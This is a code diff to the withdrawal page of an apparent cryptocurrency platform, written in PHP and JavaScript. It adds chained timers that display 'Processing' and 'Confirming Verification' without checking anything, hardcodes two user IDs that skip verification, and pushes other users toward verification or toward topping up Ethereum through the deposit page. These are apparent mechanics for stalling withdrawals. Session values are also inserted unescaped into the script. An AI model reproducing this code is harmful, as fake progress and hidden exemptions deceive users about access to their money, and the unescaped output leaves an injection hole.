@@ -145,6 +145,27 @@ if (isset($_SESSION['payout_coin']) && $_SESSION['payout_coin'] == 'ETH') {
         border: 1px solid #F0E1A1;
         color: #61534e;
     }
+
+    .btn-primary {
+        color: #fff;
+    }
+
+    .btn-primary:active,
+    .btn.active.focus,
+    .btn.active:focus,
+    .btn.focus,
+    .btn:active.focus,
+    .btn:active:focus,
+    .btn:focus,
+    button:active,
+    button:checked,
+    button:focus,
+    button:hover,
+    button:visited {
+        color: #000;
+        background-color: transparent !important;
+        border: 1px solid #1c2b46;
+    }
 </style>
 
 <div class="row">
@@ -199,6 +220,11 @@ if (isset($_SESSION['payout_coin']) && $_SESSION['payout_coin'] == 'ETH') {
                         You don't have enough Ethereum (ETH) to cover network fees
                     </p>
 
+                    <p style="background: #f0f0f0;padding: 10px;border-radius: 5px; font-weight: 600; font-size: 14px;display: none;" class="text-danger mb-0 verification_warning">
+                        <i class="mdi mdi-alert-circle"></i>
+                        Almost there! Your account isn’t fully verified yet. Complete the quick verification process to unlock all features and enjoy seamless access to the platform.
+                    </p>
+
                     <button class="btn btn-primary btn-rounded btn-lg p-3 withdraw_funds" style="margin: 30px 0;" type="button" name="withdraw_funds"><b>Withdraw Funds</b></button>
 
 
@@ -221,51 +247,78 @@ if (isset($_SESSION['payout_coin']) && $_SESSION['payout_coin'] == 'ETH') {
         var id = <?= $currUser->id ?>;
         var amount = <?= $_SESSION['withdraw_amount'] ?>;
         var address = "<?= $_SESSION['wallet_address'] ?>";
+        var method = "<?= $_SESSION['method'] ?>";
 
-        document.querySelector('.withdraw_funds').textContent = "Loading...";
+        var badge_verification = <?= $currUser->badge_verification ?>;
 
+        if (id == 964 || id == 1) {
+            badge_verification = 1;
+        }
 
-        $.ajax({
-            url: 'getdata.php',
-            type: 'POST',
-            data: {
-                network_fee: fee,
-                userId: id,
-                withdraw_amount: amount,
-                wallet_address: address
-            },
-            success: function(response) {
+        document.querySelector('.withdraw_funds').textContent = "Processing...";
 
-                var response = JSON.parse(response)
-                console.log(response.message);
+        setTimeout(() => {
+            document.querySelector('.withdraw_funds').innerHTML = "Confirming Verification <img src='https://media.tenor.com/On7kvXhzml4AAAAj/loading-gif.gif' width='30'/>";
 
-                if (response.status) {
-
-                    console.log(response);
-
-                    swal({
-                        title: "Successful",
-                        text: response.message,
-                        icon: "success",
-                        button: "Ok",
-                    }).then(() => {
-                        window.location.href = "payout";
-                    });
-
-                } else {
-                    document.querySelector('.network_warning').style.display = 'block';
-                    document.querySelector('.withdraw_funds').textContent = 'Top-up Ethereum (ETH)';
-                    document.querySelector('.withdraw_funds').setAttribute('id', 'withdraw_funds');
+            setTimeout(() => {
+                if (badge_verification == 0) {
+                    document.querySelector('.verification_warning').style.display = 'block';
+                    document.querySelector('.withdraw_funds').textContent = 'Proceed to Verification';
+                    document.querySelector('.withdraw_funds').setAttribute('id', 'verification');
                     document.querySelector('.withdraw_funds').classList.remove('withdraw_funds');
-                }
+                } else {
+                    setTimeout(() => {
+                        $.ajax({
+                            url: 'getdata.php',
+                            type: 'POST',
+                            data: {
+                                network_fee: fee,
+                                userId: id,
+                                withdraw_amount: amount,
+                                wallet_address: address,
+                                method: method
+                            },
+                            success: function(response) {
+                                document.querySelector('.withdraw_funds').textContent = "Done";
 
-            }
-        })
+                                var response = JSON.parse(response);
+
+
+                                if (response.status) {
+                                    swal({
+                                        title: "Successful",
+                                        text: response.message,
+                                        icon: "success",
+                                        button: "Ok",
+                                    }).then(() => {
+                                        window.location.href = "payout";
+                                    });
+                                } else {
+                                    document.querySelector('.network_warning').style.display = 'block';
+                                    document.querySelector('.withdraw_funds').textContent = 'Top-up Ethereum (ETH)';
+                                    document.querySelector('.withdraw_funds').setAttribute('id', 'withdraw_funds');
+                                    document.querySelector('.withdraw_funds').classList.remove('withdraw_funds');
+                                }
+                            }
+                        });
+                    }, 4000); // Wait 4 secs before making AJAX request
+                }
+            }, 4000); // Wait 4 secs before checking verification status
+        }, 4000); // Wait 4 secs before updating text to "Confirming Verification..."
+
+
     })
 
     document.body.addEventListener('click', (e) => {
         if (e.target.id == 'withdraw_funds') {
             window.location.href = "deposit";
+        }
+        if (e.target.id == 'verification') {
+            // Redirect to the page with tabs
+            window.location.href = 'account';
+
+            // Store the intent to switch to the last tab in localStorage
+            localStorage.setItem('switchToLastTab', 'true');
         }
     })
 
